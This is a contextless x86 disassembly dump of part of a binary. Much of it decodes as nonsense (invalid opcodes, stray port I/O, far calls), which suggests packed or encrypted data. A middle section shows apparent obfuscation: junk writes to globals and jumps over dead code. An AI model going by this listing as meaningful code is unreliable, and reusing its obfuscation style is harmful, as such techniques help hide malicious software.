  417237:	adc    ah,ah
  417239:	lea    ebp,[ebx-0x4d]
  41723c:	xchg   edx,esp
  41723e:	push   esi
  41723f:	jb     0x417269
  417241:	in     al,0xb7
  417243:	add    ecx,DWORD PTR [edx]
  417245:	sbb    cl,BYTE PTR [eax+0x68d3740b]
  41724b:	and    eax,0x761234f7
  417250:	call   0xcc17:0xb8e83990
  417257:	scas   al,BYTE PTR es:[edi]
  417258:	enter  0xc8a9,0x12
  41725c:	sub    al,0x43
  41725e:	push   edi
  41725f:	or     ecx,DWORD PTR [eax-0x2282beeb]
  417265:	test   al,0x88
  417267:	sar    edx,0x61
  41726a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726b:	gs push ss
  41726d:	sti    
  41726e:	dec    ebx
  41726f:	(bad)  
  417270:	dec    edi
  417271:	arpl   WORD PTR [ecx+0x19],cx
  417274:	pop    es
  417275:	mov    fs,edx
  417277:	inc    ecx
  417278:	cmp    BYTE PTR [edx+ebp*8],0x3c
  41727c:	sbb    eax,0x5c691ce6
  417281:	or     BYTE PTR [ecx],al
  417283:	in     al,dx
  417284:	stos   BYTE PTR es:[edi],al
  417285:	xchg   esp,eax
  417286:	inc    ecx
  417287:	jb     0x41725f
  417289:	test   DWORD PTR [esi+0x5a9b281],esp
  41728f:	pop    esp
  417290:	mov    DWORD PTR [edi],ebp
  417292:	xchg   esi,eax
  417293:	pop    ss
  417294:	mov    DWORD PTR [ebp-0x9e3b630],0x7621719
  41729e:	or     BYTE PTR [ebp+0x3],0xb4
  4172a2:	adc    al,0xdf
  4172a4:	(bad)  [ebp-0x73]
  4172a7:	pushf  
  4172a8:	enter  0x7d72,0xe1
  4172ac:	or     ebx,eax
  4172ae:	test   eax,0xc080df3a
  4172b3:	dec    ecx
  4172b4:	mov    bh,0x8c
  4172b6:	adc    BYTE PTR [eax-0x51663599],ah
  4172bc:	xlat   BYTE PTR ds:[ebx]
  4172bd:	pop    esi
  4172be:	push   ds
  4172bf:	add    DWORD PTR [edx],esi
  4172c1:	retf   0xb8df
  4172c4:	or     DWORD PTR ds:0x2655bcf4,ebx
  4172ca:	xchg   ebx,eax
  4172cb:	pop    ebp
  4172cc:	jns    0x4172c2
  4172ce:	outs   dx,DWORD PTR ds:[esi]
  4172cf:	test   DWORD PTR [eax+0x45822c4c],ebx
  4172d5:	xor    esp,DWORD PTR [esi+eiz*1+0x4717cddb]
  4172dc:	inc    edi
  4172dd:	test   DWORD PTR [esi-0x28],edi
  4172e0:	(bad)  
  4172e1:	jmp    0x417266
  4172e3:	inc    esi
  4172e4:	out    dx,al
  4172e5:	add    BYTE PTR [edi-0x1c89b739],dl
  4172eb:	mov    dh,0xef
  4172ed:	ins    DWORD PTR es:[edi],dx
  4172ee:	jnp    0x41734e
  4172f0:	cld    
  4172f1:	mov    ds:0x9d63ccaf,eax
  4172f6:	stc    
  4172f7:	enter  0xf161,0xc1
  4172fb:	xor    eax,0x2f28463f
  417300:	shl    BYTE PTR [eax+edi*4-0x69],cl
  417304:	inc    edx
  417305:	cmp    eax,0xb05def2
  41730a:	inc    esi
  41730b:	cmp    ch,bh
  41730d:	cmp    ebx,0x7f3f04d3
  417313:	mov    bl,0x9c
  417315:	out    dx,eax
  417316:	fistp  QWORD PTR [edx-0x1b]
  417319:	lods   eax,DWORD PTR ds:[esi]
  41731a:	adc    ecx,DWORD PTR [ebp+0xe02d7bf]
  417320:	push   esp
  417321:	ret    
  417322:	fdiv   DWORD PTR [ecx]
  417324:	sar    DWORD PTR [edx],cl
  417326:	ret    0xec23
  417329:	mov    ebp,0xddc56181
  41732e:	and    eax,0x1e1918ab
  417333:	push   es
  417334:	sti    
  417335:	xor    ch,cl
  417337:	xlat   BYTE PTR ds:[ebx]
  417338:	and    BYTE PTR [ebp-0x56983c68],dl
  41733e:	mov    bl,0x42
  417340:	jne    0x41737e
  417342:	call   0xab41:0x604f8820
  417349:	cmp    DWORD PTR ds:[ebp-0x47],esi
  41734d:	(bad)  [ebx-0x73]
  417350:	inc    esp
  417351:	and    al,0x44
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x4282cd,0x0
  41735e:	mov    DWORD PTR ds:0x428411,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x4283b5,0x6fab
  417378:	mov    DWORD PTR ds:0x4283a9,0x3325
  417382:	cmp    DWORD PTR ds:0x4282cd,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x4284fd,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428519
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x42844d
  4173bb:	mov    edx,DWORD PTR ds:0x428545
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x4282f5,0x0
  4173ce:	mov    DWORD PTR ds:0x428419,0x322b
  4173d8:	mov    DWORD PTR ds:0x428315,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x4282e5
  4173e8:	mov    DWORD PTR ds:0x42846d,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x4282ed,edx
  4173fd:	cmp    DWORD PTR ds:0x4282f5,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x4281e3
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x4282f1,0x4806
  417422:	add    DWORD PTR ds:0x428481,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x4282f9,0x2f2b
  41743c:	add    DWORD PTR ds:0x428521,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x4282dd
  417452:	xor    DWORD PTR ds:0x4282f9,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x42849d
  417462:	mov    eax,ds:0x4226a8
  417467:	sbb    DWORD PTR ds:0x428419,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42841d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42830d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42841d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x42848d,0x19ab
  4174b1:	xor    DWORD PTR ds:0x4282e1,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x4284f9
  4174c1:	sub    DWORD PTR ds:0x428409,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x4283bd
  4174d1:	or     DWORD PTR ds:0x428485,edx
  4174d7:	adc    DWORD PTR ds:0x428491,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x4284b5
  4174e5:	mov    ecx,DWORD PTR ds:0x428531
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x4283e9
  417500:	sub    edx,DWORD PTR ds:0x42840d
  417506:	mov    DWORD PTR ds:0x4283e9,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x4282d9,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x4283b5,0x0
  417540:	movzx  ecx,WORD PTR ds:0x4282e5
  417547:	movzx  ecx,BYTE PTR ds:0x4283d9
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x4283b5,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x428521
  417587:	add    edx,DWORD PTR ds:0x428489
  41758d:	mov    DWORD PTR ds:0x428521,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x428359
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x4284d1
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42830d,edx
  4175ae:	xor    DWORD PTR ds:0x428509,ebx
  4175b4:	sbb    DWORD PTR ds:0x4283a5,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428419,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42841d
  4175d9:	mov    DWORD PTR ds:0x4282e9,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x4283ad
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x4283d1,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428419,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x4282f1
  417614:	adc    DWORD PTR ds:0x4283bd,0x1011
  41761e:	sbb    DWORD PTR ds:0x428475,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x4283a5
  41762c:	xor    DWORD PTR ds:0x4284ed,edx
  417632:	add    DWORD PTR ds:0x4283ad,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x4284a1,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x428495,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x4284e5
  41766e:	mov    DWORD PTR ds:0x428311,edi
  417674:	cmp    DWORD PTR ds:0x4284a1,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x4283e9,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x428521
  41769a:	or     DWORD PTR ds:0x428505,edx
  4176a0:	sub    DWORD PTR ds:0x4284ed,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x4282d1
  4176ae:	movzx  edx,WORD PTR ds:0x4284e5
  4176b5:	sub    DWORD PTR ds:0x42849d,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x4282d5,0x428301
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428305,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x42847d,0x4282f1
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428405
  4176f8:	adc    DWORD PTR ds:0x428511,eax
  4176fe:	mov    eax,ds:0x4226a8
  417703:	or     DWORD PTR ds:0x4283ad,0x4283e1
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x4283c5,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x4282f1,0x428405
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x4283ad,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x4283d5,0x428311
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x4283b1,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42850d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428505,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x428421,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428419,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	pop    esi
  4177ab:	jbe    0x41779f
  4177ad:	iret   
  4177ae:	sti    
  4177af:	faddp  st(0),st
  4177b1:	mov    esi,0xbebec235
  4177b6:	xchg   esi,eax
  4177b7:	xchg   esi,eax
  4177b8:	xchg   edi,eax
  4177b9:	ret    
  4177ba:	test   eax,0x5f4958d4
  4177bf:	in     al,dx
  4177c0:	in     al,0x99
  4177c2:	fnclex 
  4177c4:	jle    0x4177c1
  4177c6:	int    0x46
  4177c8:	fisub  WORD PTR [eax]
  4177ca:	mov    al,0x7e
  4177cc:	lea    esp,[ecx+0x71]
  4177cf:	inc    edi
  4177d0:	lahf   
  4177d1:	xor    eax,0x98b3e641
  4177d6:	or     WORD PTR [ecx-0x6f61c87a],bp
  4177dd:	mov    eax,ds:0x9508e5d8
  4177e2:	dec    eax
  4177e3:	shl    DWORD PTR [edi*4+0x6a7e5702],cl
  4177ea:	icebp  
  4177eb:	lods   eax,DWORD PTR ds:[esi]
  4177ec:	jg     0x4177c5
  4177ee:	jg     0x41783b
  4177f0:	shr    eax,cl
  4177f2:	inc    edi
  4177f3:	repnz and al,0x30
  4177f6:	or     eax,0xfb6c0f59
  4177fb:	adc    edx,DWORD PTR [eax-0x27]
  4177fe:	or     BYTE PTR [esi-0x6d],ch
  417801:	inc    ebx
  417802:	sti    
  417803:	jge    0x417829
  417805:	mov    bh,0xf
  417807:	push   0xffffffae
  417809:	daa    
  41780a:	and    al,0xcd
  41780c:	and    eax,0x769dd255
  417811:	les    ebp,FWORD PTR [esp+edi*1]
  417814:	in     al,0xd9
  417816:	scas   eax,DWORD PTR es:[edi]
  417817:	out    0x52,eax
  417819:	push   0xffffffa0
  41781b:	xchg   edi,eax
  41781c:	stos   DWORD PTR es:[edi],eax
  41781d:	mov    al,ds:0x42c379a7
  417822:	jbe    0x41783e
  417824:	jmp    0xe88:0x248ce32e
  41782b:	xchg   ebp,eax
  41782c:	sbb    DWORD PTR [ebp-0x6307ff8d],ebx
  417832:	sti    
  417833:	ret    0x51ab
  417836:	or     ch,BYTE PTR [ebp-0x52c5719e]
  41783c:	push   esp
  41783d:	std    
  41783e:	and    DWORD PTR [ebp+0x4fa6fff8],ecx
  417844:	rol    dl,1
  417846:	jmp    0x13d372bb
  41784b:	push   esp
  41784c:	and    edi,DWORD PTR [edx+edi*4]
  41784f:	inc    edi
  417850:	into   
  417851:	push   0x7f793eeb
  417856:	lods   eax,DWORD PTR ds:[esi]
  417857:	pop    ss
  417858:	and    eax,ecx
  41785a:	pop    esi
  41785b:	fsubr  st(0),st
  41785d:	ficom  WORD PTR [edi]
  41785f:	cmp    al,0x4b
  417861:	mov    eax,0xa6fdeda2
  417866:	ret    
  417867:	jle    0x417878
  417869:	push   cs
  41786a:	push   edi
  41786b:	dec    esi
  41786c:	aad    0x21
  41786e:	jmp    0x292b:0x7bd59356
  417875:	lods   al,BYTE PTR ds:[esi]
  417876:	jg     0x417827
  417878:	and    eax,0x523f340e
  41787d:	and    dh,dh
  41787f:	mov    ds:0xc02d7569,al
  417884:	retf   0x65a0
  417887:	hlt    
  417888:	push   ss
  417889:	in     al,0xe5
  41788b:	xchg   edx,eax
  41788c:	inc    DWORD PTR [ebx]
  41788e:	push   0x6d
  417890:	adc    DWORD PTR [edx+0x587b2abf],0xffffff8d
  417897:	dec    edx
  417898:	push   ebp
  417899:	outs   dx,BYTE PTR ds:[esi]
  41789a:	cmp    dh,BYTE PTR [edi]
  41789c:	mov    ds:0xcedb7c7a,eax
  4178a1:	dec    eax
  4178a2:	fsubr  st(1),st
  4178a4:	nop
  4178a5:	adc    ebx,DWORD PTR [edx-0x6d]
  4178a8:	rcr    DWORD PTR [ebp-0x741148c5],cl
  4178ae:	jl     0x417876
  4178b0:	cwde   
  4178b1:	push   ds
  4178b2:	call   0xe18c7773
  4178b7:	icebp  
  4178b8:	jae    0x417845
  4178ba:	push   cs
  4178bb:	lods   eax,DWORD PTR ds:[esi]
  4178bc:	ja     0x417893
  4178be:	pop    ebx
  4178bf:	test   eax,0x627efbb5
  4178c4:	test   eax,0x84d0d0e
  4178c9:	jmp    0x9f6:0x7bdc99b
  4178d0:	test   bh,0x4c
  4178d3:	jns    0x4178dd
  4178d5:	ss push es
  4178d7:	or     al,BYTE PTR [esi+0x37]
  4178da:	imul   edx,DWORD PTR [ebx],0x23
  4178dd:	repnz mov edx,0x4e28d8a9
  4178e3:	inc    ebp
  4178e4:	dec    esp
  4178e5:	(bad)  
  4178e6:	adc    BYTE PTR [edx],dl
  4178e8:	gs pop ds
  4178ea:	inc    edx
  4178eb:	or     BYTE PTR [ecx-0x3633c3bb],cl
  4178f1:	xor    eax,0xeb9d76cb
  4178f6:	xor    al,0xc2
  4178f8:	or     DWORD PTR [ebx+ebx*2+0x9c09b86],esi
  4178ff:	jge    0x417932
  417901:	js     0x417946
  417903:	jo     0x41795c
  417905:	gs pop es
  417907:	or     bl,BYTE PTR [ebx]
  417909:	shr    ch,1
  41790b:	(bad)  
  41790c:	pop    eax
  41790d:	ffree  st(6)
  41790f:	sbb    DWORD PTR [ecx],0x583826c
  417915:	(bad)  
  417916:	pop    DWORD PTR [ebx]
  417918:	(bad)  
  417919:	aad    0xbf
  41791b:	dec    ecx
  41791c:	retf   
  41791d:	ins    DWORD PTR es:[edi],dx
  41791e:	cmovp  esi,DWORD PTR [ebp+0x5c]
  417922:	sub    bh,cl
  417924:	xor    eax,0x170bc039
  417929:	jns    0x4178d5
  41792b:	pop    ss
  41792c:	dec    esi
  41792d:	addr16 ds xchg esp,eax
  417930:	mov    gs,WORD PTR [ebx]
  417932:	sbb    BYTE PTR [ecx-0x15e7bc96],0x60
  417939:	dec    ebp
  41793a:	cmp    dl,BYTE PTR [esi+esi*8-0x15]
  41793e:	pop    ss
  41793f:	retf   0xd6e3
  417942:	scas   al,BYTE PTR es:[edi]
  417943:	push   ds
  417944:	adc    DWORD PTR [ebx+eiz*8-0x7e],ecx
  417948:	pop    edi
  417949:	push   esp
  41794a:	(bad)  
  41794b:	std    
  41794c:	jae    0x4178eb
  41794e:	push   ecx
  41794f:	shl    DWORD PTR [edx],1
  417951:	cmp    eax,0xd4e3f05a
  417956:	jnp    0x4179ae
  417958:	or     al,0x87
  41795a:	jecxz  0x4179d7
  41795c:	mov    dh,0x99
  41795e:	fucomi st,st(4)
  417960:	mov    esi,0x72d784e
  417965:	and    al,0xee
  417967:	mov    ch,dh
  417969:	or     DWORD PTR [ebx],ebp
  41796b:	xchg   ebp,eax
  41796c:	das    
  41796d:	mov    ch,0xe0
  41796f:	mov    dh,0x36
  417971:	pop    ebp
  417972:	jp     0x41792c
  417974:	push   0xa4358b21
  417979:	sub    al,0xb4
  41797b:	(bad)  
  41797d:	call   0xa23b:0xf41cb4a1
  417984:	in     eax,dx
  417985:	adc    DWORD PTR [ebx],esp
  417987:	sahf   
  417988:	dec    edi
  417989:	int3   
  41798a:	push   ss
  41798b:	test   cl,ah
  41798d:	dec    edx
  41798e:	(bad)  
  41798f:	sti    
  417990:	rcr    esp,1
  417992:	mov    ss,WORD PTR [esi-0x20a8a912]
  417998:	icebp  
  417999:	jo     0x4179c7
  41799b:	(bad)  
  41799c:	pop    edx
  41799d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41799e:	jle    0x4179c0
  4179a0:	mov    ds:0xd88467d8,eax
  4179a5:	xor    BYTE PTR [ebx],dl
  4179a7:	fnstenv [ebp+ecx*4-0x22]
  4179ab:	or     al,0x16
  4179ad:	pop    ss
  4179ae:	sub    dl,BYTE PTR [edx-0x76]
  4179b1:	(bad)
  4179b4:	leave  
  4179b5:	xchg   edx,eax
  4179b6:	jnp    0x41795c
  4179b8:	mov    ecx,esi
  4179ba:	mov    dl,0x54
  4179bc:	leave  
  4179bd:	pop    edi
  4179be:	xchg   ebp,eax
  4179bf:	fild   QWORD PTR ds:0x164ed7f0
  4179c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179c6:	push   esi
  4179c7:	call   0xce0d:0xccf2356b
  4179ce:	dec    eax
  4179cf:	cmp    ch,BYTE PTR [ecx]
  4179d1:	retf   0x149f
  4179d4:	inc    esp
  4179d5:	out    0x3,eax
  4179d7:	lds    ebx,FWORD PTR [esi-0x7772c2a0]
  4179dd:	mov    ah,ah
  4179df:	loopne 0x417a4f
  4179e1:	dec    ebx
  4179e2:	mov    ds:0x6200ff93,eax
  4179e7:	enter  0x2021,0xdc
  4179eb:	std    
  4179ec:	add    ecx,esi
  4179ee:	push   ecx
  4179ef:	mov    eax,0x9e710853
  4179f4:	jg     0x417994
  4179f6:	mov    DWORD PTR [esp+0x18],edi
  4179fa:	adc    DWORD PTR ds:0x428479,0x42830d
  417a04:	jmp    0x417c61
  417a09:	and    BYTE PTR [ecx],al
  417a0b:	fst    QWORD PTR [ecx-0x4b4b4d1d]
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	pop    ebx
  417a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a17:	push   ds
  417a18:	sahf   
  417a19:	jae    0x4179fd
  417a1b:	sar    BYTE PTR [esi-0x41413dcb],0xdf
  417a22:	push   ecx
  417a23:	dec    esp
  417a24:	mov    ebp,ebx
  417a26:	jne    0x417a3a
  417a28:	or     al,0x44
  417a2a:	rol    BYTE PTR [edi+0x74fdb98c],cl
  417a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a31:	inc    edx
  417a32:	jmp    0x417ab1
  417a34:	not    BYTE PTR [ebx-0x7a12c756]
  417a3a:	outs   dx,DWORD PTR ds:[esi]
  417a3b:	lahf   
  417a3c:	jae    0x417a72
  417a3e:	shl    eax,0x43
  417a41:	stos   BYTE PTR es:[edi],al
  417a42:	es push ebp
  417a44:	loopne 0x417a0f
  417a46:	jmp    0x417ac0
  417a48:	xchg   edx,eax
  417a49:	out    0x37,al
  417a4b:	xchg   ecx,eax
  417a4c:	inc    edx
  417a4d:	aas    
  417a4e:	or     dl,BYTE PTR [ecx+0x4b]
  417a51:	bound  ecx,QWORD PTR [edx+edi*4+0x417b2ff4]
  417a58:	xchg   ecx,eax
  417a59:	aaa    
  417a5a:	data16 sbb al,BYTE PTR [edx]
  417a5d:	inc    eax
  417a5e:	jecxz  0x417a1c
  417a60:	inc    ebp
  417a61:	popf   
  417a62:	or     eax,0xee65592a
  417a67:	push   ss
  417a68:	test   al,0x43
  417a6a:	push   eax
  417a6b:	sahf   
  417a6c:	iret   
  417a6d:	push   cs
  417a6e:	add    BYTE PTR [ebp+0x379b515b],ah
  417a74:	(bad)  [edx]
  417a76:	mov    ebp,ds
  417a78:	dec    eax
  417a79:	in     al,dx
  417a7a:	jl     0x417a94
  417a7c:	push   esp
  417a7d:	pop    ebp
  417a7e:	add    al,0x3b
  417a80:	mov    dl,0x7e
  417a82:	jb     0x417a5b
  417a84:	mov    esp,0xedfa1270
  417a89:	or     DWORD PTR [edx+0x19402c16],edx
  417a8f:	xor    eax,0xa8da4c0f
  417a94:	mov    dh,0xe
  417a96:	pop    esi
  417a97:	jl     0x417a41
  417a99:	stos   DWORD PTR es:[edi],eax
  417a9a:	add    bl,BYTE PTR ds:0xd3e6388c
  417aa0:	adc    al,0x27
  417aa2:	fs xchg esi,eax
  417aa4:	and    edi,DWORD PTR [edx-0x7e50ba08]
  417aaa:	ja     0x417a3f
  417aac:	test   eax,0xc9dade7
  417ab1:	lahf   
  417ab2:	xchg   DWORD PTR ds:0x119b8c11,esi
  417ab8:	sub    eax,0x7c705cc9
  417abd:	imul   dl
  417abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ac0:	fild   DWORD PTR [eax-0x37e7deea]
  417ac6:	lahf   
  417ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ac8:	retf   0x9082
  417acb:	mov    al,ds:0xd19e9847
  417ad0:	call   0xaea3f56d
  417ad5:	xchg   BYTE PTR [edx],al
  417ad7:	xlat   BYTE PTR ds:[ebx]
  417ad8:	das    
  417ad9:	out    0x8c,eax
  417adb:	push   0x1c058758
  417ae0:	inc    ecx
  417ae1:	cmp    bh,BYTE PTR [eax]
  417ae3:	outs   dx,BYTE PTR ds:[esi]
  417ae4:	in     al,dx
  417ae5:	jecxz  0x417b3f
  417ae7:	xchg   ebx,eax
  417ae8:	mov    ecx,0xc185550d
  417aed:	and    ebp,DWORD PTR [esi+0x8e32c5d]
  417af3:	mov    BYTE PTR [edx-0x28920de2],dl
  417af9:	arpl   WORD PTR [ecx+0x59],si
  417afc:	rol    BYTE PTR [edi+0x57],cl
  417aff:	dec    esi
  417b00:	mov    WORD PTR [edi],fs
  417b02:	xor    eax,0xcd4de30
  417b07:	inc    ecx
  417b08:	pop    ecx
  417b09:	retf   0xf004
  417b0c:	(bad)  
  417b0d:	fmul   st(4),st
  417b0f:	jmp    0x417ada
  417b11:	lods   eax,DWORD PTR ds:[esi]
  417b12:	push   cs
  417b13:	mov    eax,ds:0x722c6b5d
  417b18:	sbb    BYTE PTR [ebx],dl
  417b1a:	(bad)  
  417b1b:	xchg   ecx,eax
  417b1c:	push   ebp
  417b1d:	sub    DWORD PTR [ebx-0x139ef327],eax
  417b23:	leave  
  417b24:	cs mov edi,0x990b26e6
  417b2a:	and    esi,edi
  417b2c:	pop    edi
  417b2d:	pop    ebx
  417b2e:	ds ret 
  417b30:	js     0x417b33
  417b32:	test   BYTE PTR gs:[ebp+edx*4+0x24dc3238],ah
  417b3a:	jbe    0x417b73
  417b3c:	mov    eax,0x72033d59
  417b41:	les    ecx,FWORD PTR [esi]
  417b43:	push   0xfffffff7
  417b45:	push   ebx
  417b46:	jne    0x417b15
  417b48:	fbld   TBYTE PTR [edi+0x7dfe946]
  417b4e:	mov    edx,0x60fa5c40
  417b53:	mov    esi,0x5ed34ec8
  417b58:	enter  0x6c90,0x8a
  417b5c:	popf   
  417b5d:	pop    eax
  417b5e:	cmc    
  417b5f:	and    al,0x87
  417b61:	mov    ebp,0xd87b9d0b
  417b66:	inc    esp
  417b67:	or     cl,BYTE PTR [ecx]
  417b69:	into   
  417b6a:	pop    es
  417b6b:	ficom  DWORD PTR [edx]
  417b6d:	mov    bh,0xd
  417b6f:	ret    
  417b70:	mov    WORD PTR [esi-0x56],cs
  417b73:	and    esi,esi
  417b75:	push   eax
  417b76:	xchg   esp,eax
  417b77:	and    BYTE PTR [edi+0x6d12fe0f],0xd7
  417b7e:	push   ebx
  417b7f:	inc    esi
  417b80:	jne    0x417b3d
  417b82:	sbb    BYTE PTR [esi+esi*8],dl
  417b85:	clc    
  417b86:	(bad)  
  417b87:	pop    esp
  417b88:	jo     0x417b35
  417b8a:	test   al,0x90
  417b8c:	out    dx,eax
  417b8d:	retf   
  417b8e:	push   cs
  417b8f:	inc    esp
  417b90:	(bad)  
  417b91:	jecxz  0x417be9
  417b93:	aam    0xb0
  417b95:	in     al,0x2d
  417b97:	ss fwait
  417b99:	test   BYTE PTR [ebp+0xc],0x5e
  417b9d:	hlt    
  417b9e:	xor    bl,0x3d
  417ba1:	mov    bh,0x1b
  417ba3:	call   0xc24e:0x2ba41aa5
  417baa:	in     al,0xae
  417bac:	mov    edi,0xc420de59
  417bb1:	xchg   ebx,eax
  417bb2:	iret   
  417bb3:	jg     0x417b43
  417bb5:	push   ds
  417bb6:	inc    eax
  417bb7:	and    dl,0x81
  417bba:	xor    eax,0x64e077fb
  417bbf:	inc    eax
  417bc0:	cli    
  417bc1:	or     eax,0x7cec78a8
  417bc6:	push   ss
  417bc7:	jae    0x417b4e
  417bc9:	add    eax,0xa5880f0
  417bce:	ret    
  417bcf:	lahf   
  417bd0:	addr16 cmp ax,0x67cc
  417bd5:	or     al,0xed
  417bd7:	es dec esp
  417bd9:	or     ebx,ebp
  417bdb:	(bad)  
  417bdc:	sbb    al,0x11
  417bde:	cmc    
  417bdf:	clc    
  417be0:	adc    WORD PTR [edx],bx
  417be3:	cmp    BYTE PTR [ecx],0xfa
  417be6:	enter  0x4cc3,0x47
  417bea:	cmp    eax,0xb1f70c1b
  417bef:	xor    BYTE PTR [eax],0xfb
